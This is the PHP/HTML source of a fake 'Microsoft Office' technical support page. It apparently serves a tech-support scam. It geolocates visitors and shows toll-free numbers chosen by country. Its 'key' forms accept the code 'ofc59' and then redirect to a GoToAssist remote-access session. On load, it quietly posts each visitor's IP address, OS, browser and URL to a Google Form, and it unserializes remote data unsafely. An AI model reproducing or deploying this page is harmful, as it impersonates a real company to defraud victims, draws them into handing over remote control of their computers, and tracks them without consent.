<?php
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$str_info = substr($u_agent, 11, 50);
$os=substr($str_info, 0, strpos($str_info, "AppleWebKit")); 


function getBrowser()
{
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$bname = 'Unknown';
$platform = 'Unknown';
$version= "";

//First get the platform?
if (preg_match('/linux/i', $u_agent)) {
$platform = 'linux';
}
elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
$platform = 'mac';
}
elseif (preg_match('/windows|win32/i', $u_agent)) {
$platform = 'windows';
}

// Next get the name of the useragent yes seperately and for good reason
if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
{
$bname = 'Internet Explorer';
$ub = "MSIE";
}
elseif(preg_match('/Trident/i',$u_agent))
{ // this condition is for IE11
$bname = 'Internet Explorer';
$ub = "rv";
}
elseif(preg_match('/Firefox/i',$u_agent))
{
$bname = 'Mozilla Firefox';
$ub = "Firefox";
}
elseif(preg_match('/Chrome/i',$u_agent))
{
$bname = 'Google Chrome';
$ub = "Chrome";
}
elseif(preg_match('/Safari/i',$u_agent))
{
$bname = 'Apple Safari';
$ub = "Safari";
}
elseif(preg_match('/Opera/i',$u_agent))
{
$bname = 'Opera';
$ub = "Opera";
}
elseif(preg_match('/Netscape/i',$u_agent))
{
$bname = 'Netscape';
$ub = "Netscape";
}

// finally get the correct version number
// Added "|:"
$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) .
')[/|: ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $u_agent, $matches)) {
// we have no matching number just continue
}

// see how many we have
$i = count($matches['browser']);
if ($i != 1) {
//we will have two since we are not using 'other' argument yet
//see if version is before or after the name
if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
    $version= $matches['version'][0];
}
else {
    $version= $matches['version'][1];
}
}
else {
$version= $matches['version'][0];
}

// check if we have a number
if ($version==null || $version=="") {$version="?";}

return array(
'userAgent' => $u_agent,
'name'      => $bname,
'version'   => $version,
'platform'  => $platform,
'pattern'    => $pattern
);
}

// now try it
$ua=getBrowser();
$yourbrowser= $ua['name'] . " " . $ua['version'] ;


function getIPAddress() {  
//whether ip is from the share internet  
if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
//whether ip is from the proxy  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
//whether ip is from the remote address  
else{  
     $ip = $_SERVER['REMOTE_ADDR'];  
}  
return $ip;  
}  
$ip = getIPAddress();


if(isset($_POST['submit']))
{

    $key=$_POST['key'];
}
?>
<?php  
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];      ?> 
    <?php 
    $location=(unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip)));
    $city= $location['geoplugin_city'];
    $state= $location['geoplugin_region'];
    $country= $location['geoplugin_countryName'];
    $zip= $location['geoplugin_areaCode'];
    $c_code= $location['geoplugin_countryCode'];
 ?> 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Microsoft Office </title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="./css/style.css">
    <link rel="stylesheet" href="css/banner.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;1,900&display=swap" rel="stylesheet">
    <link rel="icon" href="img/favicon.ico" type="image/x-icon">

    <link href="https://fonts.googleapis.com/css?family=Lato:300&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <style>
        ::-webkit-input-placeholder { /* Edge */
    color: #4d4d4d;
    font-size: 16px;
    font-weight: 300;
    text-align:left;
    /* padding-left:15px; */
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }
  
  :-ms-input-placeholder { /* Internet Explorer */
    color: #4d4d4d;
  }
  
  ::placeholder {
    color: #4d4d4d;
  }
      
        .rk-activ1{
            margin-top:8%;
        }
        
        #actr{
            display:none;
        }
    </style>
</head>
<body>

<div class="loader"></div>

<div class="loader1">
    <div class="">
        <div class="container">        
        <div class="navbar-header">
            <a class="navbar-brand" href="index.php"><img src="img/logo.png" class="image-responsive logo-nort" ></a>
        </div>
        <ul class="nav navbar-nav navbar-center">
	        <li class="btn btn-lg nav-btn"><a href="setup-index.php">Setup Product Key</a></li>
	        <li class="btn btn-lg nav-btn"><a href="offlog">Login</a></li>
	        <li class="btn btn-lg nav-btn"><a href="offreg">Register</a></li>
	        <li class="btn btn-lg nav-btn"><a href="off-support.php">Contact Support</a></li>
	    </ul>
        </div>
    </div>
    <div class="support_wrapper">
                <p class="text-center nd-para-sup">Office Technical Support</p>
                <h1 class="in-head-sup text-center">Call Toll Free: <?php 
if($c_code == "US")
{
echo "US/CA +1 844 514 0333";
}
elseif($c_code == "CA")
{
echo "US/CA +1 844 514 0333";
}
elseif($c_code == "GB")
{
echo "UK   +44 800 229 4983";
}
elseif($c_code == "AU")
{
echo "AU   +1 844 514 0333";
}
elseif($c_code == "NZ")
{
echo "NZ   +1 844 514 0333";
}
else
{
    echo "+1 844 514 0333";
}
?>   </h1>
                <p class="text-center nd-para-sup">We can walk you through almost any Office problem.</p>
                <p class="text-center nd-para-sup1">Our representatives are always ready to fix your issue</p>
                <h1 class="text-center su"><a href=""class="sup-chat-btn">Live Chat</a></h1>
            </div>
    <div class=" mt-5 wrapper-sup-all">
    <div class="container">
        <div class="col-lg-2 sup-icon-wrapper">
            <div class="sup-icon text-center">
                <i class="fa fa-check fa-2x" aria-hidden="true"></i>
            </div>
            <div class="sup-icon-text text-center">
                <p class=" sup-text">Get started</p>
            </div>
        </div>
        <div class="col-lg-2 sup-icon-wrapper">
            <div class="sup-icon text-center">
                <i class="fa fa-user-plus fa-2x" aria-hidden="true"></i>
            </div>
            <div class="sup-icon-text text-center">
                <p class=" sup-text">Manage account</p>
            </div>
        </div>
        <div class="col-lg-2 sup-icon-wrapper">
            <div class="sup-icon text-center">
                <i class="fa fa-indent fa-2x" aria-hidden="true"></i>
            </div>
            <div class="sup-icon-text text-center">
                <p class=" sup-text">Services & subscriptions</p>
            </div>
        </div>
        <div class="col-lg-2 sup-icon-wrapper">
            <div class="sup-icon text-center">
                <i class="fa fa-credit-card fa-2x" aria-hidden="true"></i>
            </div>
            <div class="sup-icon-text text-center">
                <p class=" sup-text">Payment & billing</p>
            </div>
        </div>
        <div class="col-lg-2 sup-icon-wrapper">
            <div class="sup-icon text-center">
                <i class="fa fa-users fa-2x" aria-hidden="true"></i>
            </div>
            <div class="sup-icon-text text-center">
                <p class=" sup-text">Family</p>
            </div>
        </div>
        <div class="col-lg-2 sup-icon-wrapper">
            <div class="sup-icon text-center">
                <i class="fa fa-wrench fa-2x" aria-hidden="true"></i>
            </div>
            <div class="sup-icon-text text-center">
                <p class=" sup-text">Troubleshoot</p>
            </div>
        </div>
        </div>
    </div><br>
    <div class="container">
        <h3 class="text-center nd-para-5">Contact Customer Support </h3>
        <div class="col-lg-8 col-md-10 col-sm-12  col-lg-offset-2 col-md-offset-2 caht-b-gr text-center">
            <div class="col-sm-4 text-center er-box">
                <h1><i class="fa fa-comments" aria-hidden="true"></i></h1>
                <p>For instant help live chat now to resolve the issues <br></p>
                <a href="javascript:void(Tawk_API.toggle())">Chat</a>
            </div>
            <div class="col-sm-4 text-center er-box">
                <h1><i class="fa fa-envelope" aria-hidden="true"></i></h1>
                <p>Email us and we will follow up within 24 hours. </p>
                <a data-toggle="modal" data-target="#myModal">Email</a>
            </div>
            <div class="col-sm-4 text-center er-box">
                <h1><i class="fa fa-user-circle-o" aria-hidden="true"></i></h1>
                <p>Connect with customer service representative for more help.</p>
                <a data-toggle="modal" data-target="#myModal1">Connect</a>
            </div>
            <p class="foo-copy"></p>
            <hr>
            <div class="fo-list">
                <ul>
                    <li>English &nbsp;| &nbsp;</li>
                    <li>Legal Notices &nbsp; |&nbsp;</li>
                    <li>License Agreement &nbsp; |&nbsp; </li>
                    <li>Privacy Policy &nbsp; |&nbsp;</li>
                    <li>Support Policy &nbsp; | &nbsp;</li>
                    <li>Careers &nbsp; | &nbsp;</li>
                    <li>Cookies &nbsp; |&nbsp;</li>
                    <li>System Status<li>
                </ul>
            </div>
            <hr>
            <div class="copyright-foo">
                <ul>
                    <li><img src="img/sy.png" class="image-responsive co-fo-im" alt=""></li>
                    <li>Copyright © 2019 Microsoft Office Inc. All rights reserved.</li>
                </ul>
            </div>
        </div>
    </div>
</div>

<!-- Email Modal -->

<div class="modal fade" id="myModal" role="dialog">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-body text-center">
                    <form action="" id="form1">
                        <span class="email-span"></span>
                        <p class="modal-cont">Chat with a support representative to generate key</p>
                        <input type="text" class="modal-input email-input" placeholder="Enter your Key">
                        <input type="submit" value="Submit" class="modal-submit">
                    </form>
                </div>
            </div>
         </div>
    </div>

<!-- //Email Modal -->
<!-- connect Modal -->

    <div class="modal fade" id="myModal1" role="dialog">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-body text-center">
                    <form action="" id="form2">
                        <span class="contact-span"></span>
                        <p class="modal-cont">Chat with a support representative to generate key</p>
                        <input type="text" class="modal-input contact-input" placeholder="Enter your Key">
                        <input type="submit" value="Submit" class="modal-submit">
                    </form>
                </div>
            </div>
         </div>
    </div>

<!-- //connect Modal -->
<div class="footer">
  <p><span class="cont-text">Customer Support Toll Free :</span> <span class="number-hp">
  <?php 
if($c_code == "US")
{
echo "US/CA +1 844 514 0333";
}
elseif($c_code == "CA")
{
echo "US/CA +1 844 514 0333";
}
elseif($c_code == "GB")
{
echo "UK   +44 800 229 4983";
}
elseif($c_code == "AU")
{
echo "AU   +1 844 514 0333";
}
elseif($c_code == "NZ")
{
echo "NZ   +1 844 514 0333";
}
else
{
    echo "+1 844 514 0333";
}
?> 
  </span> </p>
</div>
</body>
</html>
<!-- <script>
    $(document).ready(function(){
    $(".loader1").hide();
    setTimeout(function(){
	$(".loader1").show();
},6000);

    setTimeout(function(){
	$(".loader").hide();
},6000);
});
</script> -->
<script>
    function redirect()
    {
        window.location="form.php";
    }
    function redirect1()
    {
        window.location="https://fastsupport.gotoassist.com/";
    }

    $("#form1").submit(function()
    {
        var a =$(".email-input").val();
        if(a === "ofc59")
        {
            setTimeout("redirect()",0)
        }
        else{
            $(".email-span").text("Not valid").show();
            event.preventDefault();
        }
          
    });
    
    $("#form2").submit(function(){
        var b = $(".contact-input").val();
        if(b === "ofc59")
        {
            setTimeout("redirect1()", 0)
        }
        else
        {
            $(".contact-span").text("Not Valid").show();
            event.preventDefault();
        }
    })
</script>
<!--Start of Tawk.to Script--> 
<script type="text/javascript"> var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date(); (function(){ var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0]; s1.async=true; s1.src='https://embed.tawk.to/5bbfe6d208387933e5bb0362/default'; s1.charset='UTF-8'; s1.setAttribute('crossorigin','*'); s0.parentNode.insertBefore(s1,s0); })(); </script> 
<!--End of Tawk.to Script-->
<script>
$(document).ready(function(){
            
            var field1 = "<?php echo $ip; ?>";
            var field2 = "<?php echo $os; ?>";
            var field3 = "<?php echo $yourbrowser; ?>";
            var field4 = "<?php echo $url; ?>";

            var issue= "OFF";
           
           $.ajax({
                url: "https://docs.google.com/forms/d/e/1FAIpQLSf4ScufwA8nfMkFqP9Qli5VAIED14m2660bFVQpIaDEiOi0Qw/formResponse",
			    data: {"entry.1656736278": field1, "entry.926948088": field3, "entry.2004208092":field2, "entry.557824394":issue, "entry.64249553":field4},
                type: "POST",
                dataType: "xml",
               success: function(d)
			{
			},
            
			error: function(x, y, z)
				{
                    setTimeout("ssss()", 100);
					
				}
           });
		return false; 
                 
});
</script>